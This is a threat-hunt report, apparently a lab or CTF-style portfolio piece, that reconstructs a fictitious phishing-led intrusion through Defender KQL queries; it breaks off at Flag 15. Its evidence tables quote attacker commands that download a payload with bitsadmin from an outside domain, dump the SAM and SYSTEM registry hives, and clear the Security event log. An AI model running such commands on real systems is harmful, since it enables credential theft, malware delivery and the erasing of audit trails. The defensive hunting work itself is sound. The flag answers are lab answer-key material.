# Threat Hunt "The Broker"

<p align="center">
  <img
    src="images/Initial Alert.png"
    width="1200"
    alt="Triggering Security Alert"
  />
</p>

# 🛡️ Threat Hunt Report – Hands-On-Keyboard Intrusion Reconstruction

---

## ⚠️ Disclaimer
All users, systems, and environments referenced in this report are part of a controlled lab environment and are entirely fictitious.  
This investigation was conducted for educational and portfolio demonstration purposes.

---

## 🔔 Triggering Alert

This investigation began with a high-severity Microsoft Defender alert indicating a **compromised account performing hands-on-keyboard activity** on endpoint **as-pc1**.

The alert highlighted suspicious interactive behavior tied to a legitimate user account and included early indicators of:
- Credential access activity
- Account manipulation
- Local reconnaissance
- Potential defense evasion

While the alert alone did not reveal the full scope of the intrusion, it provided a critical starting point for deeper investigation and full attack lifecycle reconstruction.

This report expands that initial signal into a complete forensic timeline, uncovering the attacker’s entry vector, persistence mechanisms, lateral movement patterns, and in-memory credential theft activity.

---

## 📌 Executive Summary

This threat hunt reconstructs a full end-to-end intrusion that began with a phishing-based initial compromise and evolved into a multi-stage hands-on-keyboard attack spanning multiple hosts.

The intrusion originated from a double-extension phishing payload masquerading as a resume file, which was executed on workstation **as-pc1**. Shortly after execution, the attacker established command-and-control communications, cleared critical Windows event logs, and began operating interactively within the environment using living-off-the-land techniques.

Following initial foothold establishment, the attacker conducted credential harvesting through registry hive dumping and later deployed legitimate remote administration tooling to maintain persistent access. The intrusion expanded through lateral movement across multiple hosts using a combination of remote execution attempts and interactive RDP sessions.

As the attack progressed, the adversary implemented layered persistence mechanisms, including scheduled tasks, masqueraded binaries, and local backdoor account creation. The attacker ultimately accessed sensitive financial data on an internal file server, staged it into compressed archives, and prepared it for exfiltration.

Despite deliberate anti-forensics efforts — including log clearing, binary masquerading, and reflective in-memory execution — endpoint telemetry preserved sufficient artifacts to reconstruct the full attack chain. Notably, the investigation uncovered fileless execution of GhostPack tooling, including reflective loading of SharpChrome into legitimate Windows processes for credential theft.

This investigation demonstrates how a single compromised endpoint can evolve into a multi-host intrusion involving persistence hardening, credential abuse, lateral movement, data staging, and advanced defense evasion techniques.

---

## 🎯 Hunt Objectives

- Reconstruct the full intrusion timeline from initial access to post-exploitation activity  
- Identify attacker tooling, infrastructure, and persistence mechanisms  
- Map observed behaviors to MITRE ATT&CK techniques  
- Attribute lateral movement and compromised identities across hosts  
- Identify data access and staging activity prior to exfiltration  
- Detect defense evasion and fileless execution techniques  
- Produce a complete forensic reconstruction suitable for SOC and IR workflows

---

## 🧠 Investigation Overview

This hunt was conducted using Microsoft Defender Advanced Hunting telemetry, leveraging cross-domain analysis of:

- Process execution and lineage
- Network communication artifacts
- File system activity
- Authentication telemetry
- In-memory execution signals

By correlating endpoint, network, and behavioral telemetry, the investigation reconstructs the attacker’s progression across the full cyber kill chain — from phishing-based initial access through credential theft, persistence establishment, lateral movement, and reflective in-memory execution.

The sections that follow document each phase of the intrusion in detail, supported by queries, telemetry evidence, and attacker tradecraft analysis.

---

## 🌐 Scope & Environment

This investigation was conducted within a controlled lab environment designed to simulate a modern enterprise endpoint ecosystem monitored by Microsoft Defender for Endpoint.

The environment consisted of multiple Windows-based systems configured to emulate a realistic corporate network, including user workstations and internal infrastructure components. All telemetry used during the investigation was sourced from Microsoft Defender Advanced Hunting, enabling cross-domain visibility into endpoint, network, identity, and in-memory activity.

### 🖥️ Systems in Scope
- **as-pc1** — Initial compromise point and primary attacker foothold  
- **as-pc2** — First lateral movement target and user activity pivot  
- **as-srv** — Internal file server hosting sensitive shared data  

### 👤 Identities Observed
- **sophie.turner** — Initially compromised user account leveraged for early-stage execution and credential access  
- **david.mitchell** — Secondary compromised account used for lateral authentication and persistence operations  

### 🧠 Telemetry Sources
The investigation leveraged multiple Defender telemetry domains to reconstruct attacker behavior:

- Process execution and lineage telemetry (DeviceProcessEvents)  
- Network communication artifacts (DeviceNetworkEvents)  
- File system activity and staging behavior (DeviceFileEvents)  
- Authentication and logon telemetry (DeviceLogonEvents)  
- In-memory execution and reflective loading signals (DeviceEvents)  

### 🎯 Investigation Scope

The hunt focused on reconstructing attacker activity across the full intrusion lifecycle, including:

- Initial access and payload execution  
- Command-and-control communications  
- Credential harvesting and registry hive dumping  
- Persistence establishment and tool deployment  
- Lateral movement across endpoints  
- Data access and staging on internal infrastructure  
- Anti-forensics and defense evasion techniques  
- Reflective loading and in-memory credential theft  

All findings were derived from Defender Advanced Hunting telemetry without reliance on external forensic tooling, emphasizing detection engineering and telemetry-driven threat hunting methodologies.

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#hunt-overview)
- [🧬 MITRE ATT&CK Summary](#mitre-attck-summary)
- [🔥 Executive MITRE ATT&CK Heatmap](#executive-mitre-attck-heatmap)
- [📊 Executive Takeaway](#executive-takeaway)
- [🔍 Flag Analysis](#flag-analysis)
- [🚨 Detection Gaps & Recommendations](#detection-gaps-recommendations)

---

## 🧠 Hunt Overview

This threat hunt reconstructed a full-spectrum hands-on-keyboard intrusion beginning with a phishing-based endpoint compromise and evolving into a multi-host attack involving credential theft, persistence hardening, lateral movement, and fileless in-memory exploitation.

The intrusion originated from execution of a socially engineered payload disguised as a resume file on workstation **as-pc1**, which immediately transitioned into interactive attacker activity. Early behaviors included log tampering, outbound command-and-control communication, and use of native Windows utilities to establish situational awareness while blending into legitimate system activity.

### Operational Characteristics

**Hands-on-keyboard activity:**  
Manual command execution using native utilities (whoami.exe, net.exe, reg.exe, schtasks.exe) indicating interactive operator control rather than automated malware execution.

**Living-off-the-land tradecraft:**  
Extensive abuse of legitimate Windows binaries (certutil, reg, net, schtasks, mstsc) to minimize detection and evade traditional signature-based defenses.

**Layered persistence:**  
Multiple concurrent persistence mechanisms including:
- Legitimate remote access tooling (AnyDesk)
- Scheduled task masquerading
- Local account creation
- Account reactivation
- Binary renaming and staged payload execution

**Stealth-focused operations:**  
Evidence of deliberate defense evasion including:
- Early event log clearing
- Masqueraded binaries in user-writable directories
- Off-disk reflective module loading
- In-memory credential theft tooling

---

### Attack Progression

**Initial compromise via phishing execution**  
Double-extension payload (daniel_richardson_cv.pdf.exe) executed, establishing the initial foothold on as-pc1.

**Immediate post-exploitation activity**  
Rapid log clearing and outbound communications confirmed active operator presence shortly after execution.

**Credential harvesting and staging**  
SAM and SYSTEM registry hives dumped and staged locally in publicly writable directories.

**Reconnaissance and privilege discovery**  
User context, network shares, and privileged group membership enumerated using native administrative utilities.

**Persistence hardening phase**  
AnyDesk deployed with unattended access alongside scheduled tasks and a service-style backdoor account.

**Lateral movement across the environment**  
PsExec and WMIC attempts followed by successful interactive RDP pivots enabled expansion across endpoints and infrastructure.

**Server access and data collection**  
Internal file server compromised with subsequent access to sensitive financial documents.

**Pre-exfiltration staging**  
Compressed archives created to bundle collected data for potential exfiltration.

**Advanced defense evasion and fileless execution**  
Reflective loading of GhostPack SharpChrome into legitimate processes enabled in-memory credential theft without disk artifacts.

---

This hunt demonstrates how a single successful phishing execution can rapidly escalate into a multi-host intrusion involving layered persistence, credential abuse, and advanced defense evasion techniques.

The investigation highlights the importance of correlating endpoint, identity, and in-memory telemetry to detect modern adversaries who rely heavily on legitimate tooling and fileless execution to evade traditional security controls. 

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority | System |
|------|-------------------|----------|----------|--------|
| 1 | Initial Access – Phishing Payload Execution | T1566 | Critical | as-pc1 |
| 2 | Malware Execution – User Execution | T1204 | Critical | as-pc1 |
| 3 | Execution – User Execution via Explorer | T1204.002 | High | as-pc1 |
| 4 | Execution – Native Process Launching | T1059 | Medium | as-pc1 |
| 5 | Process Execution Context Discovery | T1057 | Medium | as-pc1 |
| 6 | Command & Control – Application Layer Protocol | T1071 | Critical | as-pc1 |
| 7 | Command & Control – Malware Beaconing | T1071 | Critical | as-pc1 |
| 8 | Ingress Tool Transfer Infrastructure | T1105 | High | as-pc1 |
| 9 | Credential Access – Registry Hive Dumping | T1003.002 | Critical | as-pc1 |
| 10 | Credential Staging – Local File System | T1074.001 | High | as-pc1 |
| 11 | Valid Account Abuse | T1078 | Critical | as-pc1 |
| 12 | Discovery – User Context Enumeration | T1033 | Medium | as-pc1 |
| 13 | Discovery – Network Share Enumeration | T1135 | High | as-pc1 |
| 14 | Discovery – Privileged Group Enumeration | T1069.001 | High | as-pc1 |
| 15 | Persistence – Remote Access Software | T1219 | Critical | as-pc1 |
| 16 | Persistence Artifact – Tool Hash Identification | T1027 | Medium | as-pc1 |
| 17 | Ingress Tool Transfer via LOLBin | T1105 | High | as-pc1 |
| 18 | Persistence Validation via Config Access | T1547 | Medium | as-pc1 |
| 19 | Persistence Hardening – Unattended Access | T1098 | Critical | as-pc1 |
| 20 | Multi-Host Persistence Deployment | T1570 | Critical | as-pc1, as-pc2, as-srv |
| 21 | Lateral Movement – Remote Execution Attempts | T1021 | High | as-pc1 |
| 22 | Lateral Movement Target Enumeration | T1021 | High | as-pc2 |
| 23 | Lateral Movement – Remote Desktop Pivot | T1021.001 | Critical | as-pc2 |
| 24 | Lateral Movement Path Reconstruction | T1570 | Critical | Multi-host |
| 25 | Lateral Authentication via Valid Accounts | T1078 | Critical | as-pc2, as-srv |
| 26 | Account Manipulation – Activation | T1098 | High | as-pc2 |
| 27 | Privileged Account Abuse | T1078 | Critical | as-pc2 |
| 28 | Persistence – Scheduled Task | T1053.005 | Critical | Multi-host |
| 29 | Defense Evasion – Binary Masquerading | T1036 | Critical | Multi-host |
| 30 | Persistence Artifact Hashing | T1027 | Medium | Multi-host |
| 31 | Persistence – Local Account Creation | T1136.001 | Critical | Multi-host |
| 32 | Collection – Sensitive File Access | T1005 | Critical | as-srv |
| 33 | Collection – Document Interaction Evidence | T1005 | High | as-srv |
| 34 | Collection – Network Share Access | T1039 | Critical | as-pc2 |
| 35 | Data Staging – Archive Creation | T1560.001 | Critical | as-srv |
| 36 | Data Staging Artifact Identification | T1074 | High | as-srv |
| 37 | Defense Evasion – Log Clearing | T1070.001 | Critical | as-pc1 |
| 38 | Defense Evasion – Reflective Code Loading | T1620 | Critical | Multi-host |
| 39 | Credential Access – Browser Credential Theft | T1555.003 | Critical | Multi-host |
| 40 | Defense Evasion – Process Injection | T1055 | Critical | Multi-host |

---

## 🔥 Executive MITRE ATT&CK Heatmap

| ATT&CK Phase | Techniques Observed | Severity | Analyst Notes |
|-------------|--------------------|----------|---------------|
| Initial Access | Phishing Execution (T1566), User Execution (T1204) | 🔴 Critical | Double-extension phishing payload executed by user |
| Execution | Native Binary Abuse, LOLBins | 🔴 Critical | Payload leveraged trusted Windows processes |
| Persistence | Remote Access Tooling (T1219), Scheduled Tasks (T1053.005), Account Creation (T1136) | 🔴 Critical | Layered persistence across multiple hosts |
| Privilege Escalation | Valid Account Abuse (T1078) | 🟠 High | Credential reuse enabled expanded access |
| Defense Evasion | Log Clearing (T1070.001), Masquerading (T1036), Reflective Loading (T1620) | 🔴 Critical | Strong evidence of anti-forensics and fileless execution |
| Credential Access | Registry Hive Dumping (T1003), Browser Credential Theft (T1555.003) | 🔴 Critical | Combination of offline dumping and in-memory theft |
| Discovery | User Discovery (T1033), Share Enumeration (T1135) | 🟠 High | Systematic reconnaissance using native tools |
| Lateral Movement | Remote Services (T1021), RDP Pivoting | 🔴 Critical | Multi-method lateral movement including interactive RDP |
| Collection | Sensitive File Access (T1005), Network Share Collection (T1039) | 🔴 Critical | Financial data targeted on internal file server |
| Command & Control | Application Layer Protocol (T1071) | 🔴 High | Outbound communication with attacker infrastructure |
| Exfiltration Prep | Archive Staging (T1560), Data Bundling | 🟠 High | Compressed archive staged prior to potential exfiltration |
| Fileless Activity | Reflective Loading + GhostPack Tooling | 🔴 Critical | SharpChrome executed in-memory via process injection |

---

## 📊 Executive Takeaway

This intrusion represents a multi-stage hands-on-keyboard compromise combining phishing-based initial access, layered persistence, credential theft, and fileless in-memory exploitation across multiple hosts.

**Key Findings**
- Scope: Multi-host compromise across workstations and internal file server
- Method: Phishing execution followed by LOLBin abuse and credential reuse
- Persistence: AnyDesk deployment, scheduled tasks, masqueraded binaries, backdoor accounts
- Data Impact: Sensitive financial data accessed and staged for potential exfiltration
- Sophistication: Reflective loading and GhostPack tooling indicate advanced tradecraft

**Critical Indicators**
- Early log clearing shows deliberate anti-forensics behavior
- Multi-layer persistence suggests long-term access intent
- Native binary abuse allowed blending into legitimate activity
- Reflective loading confirms fileless post-exploitation maturity
- Process injection into trusted binaries enabled strong evasion

**Business Impact**
- Sensitive financial data accessed on internal infrastructure
- Credential material harvested and staged locally
- Multiple hosts persistently compromised
- Rogue accounts and tasks increase long-term breach risk
- High likelihood of continued access without remediation

**Immediate Actions**
- Reset all compromised credentials
- Remove unauthorized persistence mechanisms
- Perform full host triage across impacted systems
- Hunt for reflective loading indicators environment-wide
- Implement detections for LOLBin abuse and in-memory execution
- Review outbound traffic for potential staged exfiltration

Early detection of persistence layering and fileless execution is critical to disrupting adversaries leveraging legitimate tooling and in-memory tradecraft.

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

<details>
<summary><strong>🚩 Flag 1: First Malicious Filename</strong></summary>

### 🎯 Objective  
Identify the earliest attacker activity and associated payload filename.

---

### 📌 Finding  
Process telemetry on **as-pc1** revealed repeated log clearing using `wevtutil.exe`.  
Process lineage analysis showed the same parent executable across all events, identifying the initial phishing payload responsible for the compromise.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15 05:07:59 |
| FileName | wevtutil.exe |
| Command | wevtutil.exe cl Security |
| Parent Process | daniel_richardson_cv.pdf.exe |

---

### 🧠 Query
```kql
let t_utc = datetime(2026-01-15 05:08:27);
DeviceProcessEvents
| where DeviceName =~ "as-pc1"
| where TimeGenerated between (t_utc-2m .. t_utc+2m)
| where FileName !in~ ("RuntimeBroker.exe","backgroundTaskHost.exe","smartscreen.exe","ms-teamsupdate.exe","MusNotifyIcon.exe","conhost.exe")
| sort by TimeGenerated asc
| take 5
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
```
</details>

---
<details>
<summary><strong>🚩 Flag 2: Initial Payload SHA256</strong></summary>

### 🎯 Objective  
Identify the SHA256 hash of the initial phishing payload.

---

### 📌 Finding  
Process telemetry tied to the initial compromise window on **as-pc1** revealed the SHA256 hash of the phishing payload. The hash was extracted directly from Defender process metadata associated with the earliest execution of the malicious file.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15 05:07:59 |
| Payload | daniel_richardson_cv.pdf.exe |
| Hash Field | InitiatingProcessSHA256 |
| SHA256 | 48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5 |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15 05:05:00);
let end   = datetime(2026-01-15 05:12:00);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where ProcessCommandLine has "daniel_richardson_cv.pdf.exe"
   or InitiatingProcessCommandLine has "daniel_richardson_cv.pdf.exe"
   or FileName has "daniel_richardson"
| project Timestamp, FileName, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessSHA256
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 3: User Interaction (Execution Method)</strong></summary>

### 🎯 Objective  
Determine how the payload was initially launched by identifying the parent process that indicates the method of execution.

---

### 📌 Finding  
Process execution on **as-pc1** showed multiple downstream utilities spawned under the malicious payload `daniel_richardson_cv.pdf.exe`. While the *direct* parent process for the initial launch wasn’t explicitly captured, the execution pattern is consistent with **user-driven execution (double-click)** which maps to the Windows shell process **explorer.exe**.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15T03:59:07.1340052Z |
| FileName | HOSTNAME.EXE |
| ProcessCommandLine | hostname.exe |
| InitiatingProcessFileName | daniel_richardson_cv.pdf.exe |
| InitiatingProcessCommandLine | "Daniel_Richardson_CV.pdf.exe" |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15 00:00:00);
let end   = datetime(2026-01-23 23:59:59);
DeviceProcessEvents
| where DeviceName =~ "as-pc1"
| where Timestamp between (start .. end)
| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 4: System Reconnaissance Initiation</strong></summary>

### 🎯 Objective  
Identify the first reconnaissance command executed by the payload.

---

### 📌 Finding  
Early post-execution telemetry on **as-pc1** showed the payload spawning native discovery utilities. The earliest confirmed reconnaissance activity was the execution of `whoami.exe`, indicating the attacker began enumerating the current user context immediately after gaining execution.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15T03:58:55.6568735Z |
| FileName | whoami.exe |
| ProcessCommandLine | whoami.exe |
| InitiatingProcessFileName | daniel_richardson_cv.pdf.exe |
| InitiatingProcessCommandLine | "Daniel_Richardson_CV.pdf.exe" |

---

### 🧠 Query
```kql
DeviceProcessEvents
| where DeviceName =~ "as-pc1"
| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
| where FileName =~ "whoami.exe"
| project Timestamp,
          FileName,
          ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 5: Spawned Child Process (Notepad Execution)</strong></summary>

### 🎯 Objective  
Identify a legitimate Windows process spawned directly by the payload and recover its execution context.

---

### 📌 Finding  
Process telemetry on **as-pc1** revealed multiple native Windows binaries spawned by the malicious payload. Among these, **notepad.exe** was identified as a child process directly initiated by `daniel_richardson_cv.pdf.exe`.

Inspection of process metadata confirmed that Notepad was executed without additional arguments, indicating simple execution of a benign application as part of the payload’s activity chain.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15T05:09:53.3995975Z |
| FileName | notepad.exe |
| ProcessCommandLine | notepad.exe "" |
| InitiatingProcessCommandLine | "Daniel_Richardson_CV.pdf.exe" |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName =~ "as-pc1"
| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 6: Initial External Network Connection</strong></summary>

### 🎯 Objective  
Identify the first external network connection made by the payload.

---

### 📌 Finding  
Network telemetry revealed that the payload established an outbound connection shortly after execution on **as-pc1**. The earliest confirmed connection was made to the external domain **cdn.cloud-endpoint.net** over HTTPS, indicating potential command-and-control (C2) communication or payload staging activity.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| Timestamp (UTC) | 2026-01-15T03:47:10.786699Z |
| RemoteUrl | cdn.cloud-endpoint.net |
| RemoteIP | 104.21.30.237 |
| RemotePort | 443 |
| InitiatingProcessFileName | daniel_richardson_cv.pdf.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceNetworkEvents
| where Timestamp between (start .. end)
| where DeviceName =~ "as-pc1"
| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
| project Timestamp, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 7: C2 Initiating Process</strong></summary>

### 🎯 Objective  
Identify the process responsible for initiating outbound command-and-control (C2) communications.

---

### 📌 Finding  
Network telemetry on **as-pc1** confirmed that outbound connections to the previously identified C2 infrastructure were initiated directly by the malicious payload. The `InitiatingProcessFileName` field consistently showed **daniel_richardson_cv.pdf.exe**, confirming that the phishing payload itself established external communications immediately after execution.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Host | as-pc1 |
| RemoteUrl | cdn.cloud-endpoint.net |
| RemoteIP | 104.21.30.237 |
| RemotePort | 443 |
| InitiatingProcessFileName | daniel_richardson_cv.pdf.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceNetworkEvents
| where Timestamp between (start .. end)
| where DeviceName =~ "as-pc1"
| where InitiatingProcessFileName =~ "daniel_richardson_cv.pdf.exe"
| project Timestamp, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 8: Staging Infrastructure (Payload Hosting Domain)</strong></summary>

### 🎯 Objective  
Identify the external domain used by the attacker to host additional payloads (staging infrastructure).

---

### 📌 Finding  
Process telemetry across compromised hosts revealed repeated outbound payload retrieval using **BITSAdmin**, a native Windows utility commonly abused for stealthy file transfers. Analysis of command-line artifacts identified a staging domain used to download additional tooling.

The domain **sync.cloud-endpoint.net** appeared in multiple execution artifacts and was used to retrieve a secondary payload (`scan.exe`) into a temporary directory, confirming its role as attacker staging infrastructure.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Domain | sync.cloud-endpoint.net |
| Hits | 9 |
| Example Command | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` |
| First Seen (UTC) | 2026-01-15T04:52:22.9618142Z |
| Last Seen (UTC) | 2026-01-27T20:50:35.8888831Z |
| Technique | Living-off-the-Land Binary (BITSAdmin) |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end   = datetime(2026-02-23);
DeviceProcessEvents
| extend EventTime = coalesce(Timestamp, TimeGenerated)
| where EventTime between (start .. end)
| where DeviceName in~ ("as-pc1","as-pc2")
| extend Cmd = coalesce(ProcessCommandLine, InitiatingProcessCommandLine)
| where Cmd has_any ("http://", "https://")
| extend Url = extract(@"https?://[^\s""]+", 0, Cmd)
| extend Domain = tostring(parse_url(Url).Host)
| where isnotempty(Domain)
| summarize Hits=count(), ExampleCmd=any(Cmd), FirstSeen=min(EventTime), LastSeen=max(EventTime) by Domain
| order by Hits desc
```

</details>

---

<details>
<summary><strong>🚩 Flag 9: Registry Targets (Credential Store Dumping)</strong></summary>

### 🎯 Objective  
Identify which local registry hives were targeted by the attacker during credential harvesting.

---

### 📌 Finding  
Process telemetry across compromised hosts revealed execution of **reg.exe** commands consistent with registry hive dumping. Analysis of command-line artifacts confirmed access to sensitive credential storage locations on the local system.

Two high-value registry hives were targeted:
- **SAM** — Stores local account password hashes  
- **SYSTEM** — Contains the boot key required to decrypt SAM hashes  

This pairing strongly indicates preparation for offline credential extraction and potential lateral movement.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| DeviceName | as-pc1 |
| Hive Count | 2 |
| Targeted Hives | `HKLM\SYSTEM`, `HKLM\SAM` |
| Tool Used | reg.exe |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where FileName =~ "reg.exe"
| where ProcessCommandLine has_any (" save ", " export ")
| extend TargetHive = tostring(extract(@"(?i)\b(save|export)\s+([^\s]+)", 2, ProcessCommandLine))
| summarize count(), make_set(TargetHive) by DeviceName
```

</details>

---

<details>
<summary><strong>🚩 Flag 10: Local Staging Directory (Credential Dump Location)</strong></summary>

### 🎯 Objective  
Identify where the attacker locally staged credential dumps prior to exfiltration.

---

### 📌 Finding  
Following registry hive dumping activity, process telemetry revealed that extracted credential artifacts were written directly to disk. Command-line parsing of **reg.exe save** operations exposed the local staging path used by the attacker.

Credential dumps were staged in a publicly writable directory commonly abused during intrusions:
**C:\Users\Public**

This location provides:
- Broad write permissions  
- Low visibility compared to protected directories  
- Easy access for follow-on compression or transfer

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:13:32.7652183Z |
| Host | as-pc1 |
| Tool | reg.exe |
| Command | `"reg.exe" save HKLM\SAM C:\Users\Public\sam.hiv` |
| Output Path | `C:\Users\Public\sam.hiv` |
| Staging Directory | `C:\Users\Public` |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where FileName =~ "reg.exe"
| where ProcessCommandLine has " save "
| extend OutFile = extract(@"(?i)\bsave\s+[^\s]+\s+([A-Za-z]:\\[^\s]+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, OutFile, ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 11: Execution Identity (Credential Dump User Context)</strong></summary>

### 🎯 Objective  
Identify the user context under which credential dumping activity was executed.

---

### 📌 Finding  
After confirming registry hive dumping and local staging, process attribution fields were analyzed to determine the executing identity. Endpoint telemetry tied to **reg.exe save** operations revealed the account responsible for performing credential extraction.

The activity was executed under the compromised user:
**sophie.turner**

This confirms credential harvesting occurred within a legitimate user security context, indicating account compromise or token abuse.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:13:32.840061Z |
| Host | as-pc1 |
| Tool | reg.exe |
| AccountName | sophie.turner |
| InitiatingProcessAccountName | sophie.turner |
| Command | `"reg.exe" save HKLM\SYSTEM C:\Users\Public\system.hiv` |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where FileName =~ "reg.exe"
| where ProcessCommandLine has " save "
| project Timestamp,
         DeviceName,
         AccountName,
         InitiatingProcessAccountName,
         ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 12: Identity Verification (Post-Exploitation Validation)</strong></summary>

### 🎯 Objective  
Identify how the attacker verified their execution identity after credential harvesting.

---

### 📌 Finding  
Following credential dumping activity, process telemetry revealed execution of a native Windows identity verification utility. Attackers commonly validate their access level post-exploitation to confirm successful privilege use or token impersonation.

Endpoint telemetry confirmed execution of:
**whoami.exe**

This indicates deliberate validation of the active security context before progressing further in the intrusion.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T03:58:55.6563735Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Process | whoami.exe |
| Parent Process | daniel_richardson_cv.pdf.exe |
| Parent Command | `"Daniel_Richardson_CV.pdf.exe"` |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where FileName =~ "whoami.exe"
| project Timestamp,
         DeviceName,
         AccountName,
         ProcessCommandLine,
         InitiatingProcessFileName,
         InitiatingProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 13: Network Enumeration (Share Discovery)</strong></summary>

### 🎯 Objective  
Identify how the attacker enumerated accessible network shares during post-compromise discovery.

---

### 📌 Finding  
Following credential harvesting and identity validation, process telemetry revealed execution of a native Windows networking utility commonly used during internal reconnaissance.

Command-line artifacts confirmed execution of:
**net.exe view**

This command allows attackers to enumerate accessible network shares and neighboring systems, enabling identification of lateral movement targets and shared data repositories.

The activity occurred during the active intrusion window and aligns with observed discovery-phase tradecraft.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:01:32.0791816Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Process | net.exe |
| Command | net.exe view |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has_any ("net view", "net.exe view", "net share", "net use")
| project Timestamp,
         DeviceName,
         AccountName,
         FileName,
         ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 14: Local Admin Enumeration (Privileged Group Discovery)</strong></summary>

### 🎯 Objective  
Identify which privileged local group the attacker queried during post-compromise privilege discovery.

---

### 📌 Finding  
Following network share enumeration, process telemetry revealed execution of a native Windows command used to enumerate local group membership. This behavior is commonly observed during privilege discovery as attackers assess available administrative access.

Command-line artifacts confirmed execution of:
**net.exe localgroup administrators**

This indicates the attacker explicitly queried the local **Administrators** group to identify accounts with elevated privileges on the compromised host.

---

### 🔍 Evidence

| Field | Value |
|------|------|
| Timestamp (UTC) | 2026-01-15T04:01:19.1611938Z |
| Host | as-pc1 |
| AccountName | sophie.turner |
| Process | net.exe |
| Command | net.exe localgroup administrators |

---

### 🧠 Query
```kql
let start = datetime(2026-01-15);
let end = datetime(2026-02-23);
DeviceProcessEvents
| where Timestamp between (start .. end)
| where DeviceName in ("as-pc1","as-pc2")
| where ProcessCommandLine has_any ("net localgroup", "net.exe localgroup")
| project Timestamp,
         DeviceName,
         AccountName,
         ProcessCommandLine
| order by Timestamp asc
```

</details>

---

<details>
<summary><strong>🚩 Flag 15: Remote Access Tool (Persistence via Legitimate Software)</strong></summary>

### 🎯 Objective  
Identify the legitimate remote administration software used by the attacker to maintain persistent access.

---

### 📌 Finding  
Following reconnaissance and privilege discovery, process telemetry revealed deployment of a legitimate remote access application across compromised systems. Attackers frequently abuse trusted administrative tools to establish stealthy persistence while blending into normal IT activity.

Execution artifacts showed repeated launches of a known remote administration binary consistent with hands-on-keyboard persistence.

Binary and command-line indicators identified the tool as:
**AnyDesk**

This software enables remote desktop control and is commonly abused by threat actors to maintain durable access with minimal detection.

---

### 🔍 Evidence

| Field | Value |
|------|------|
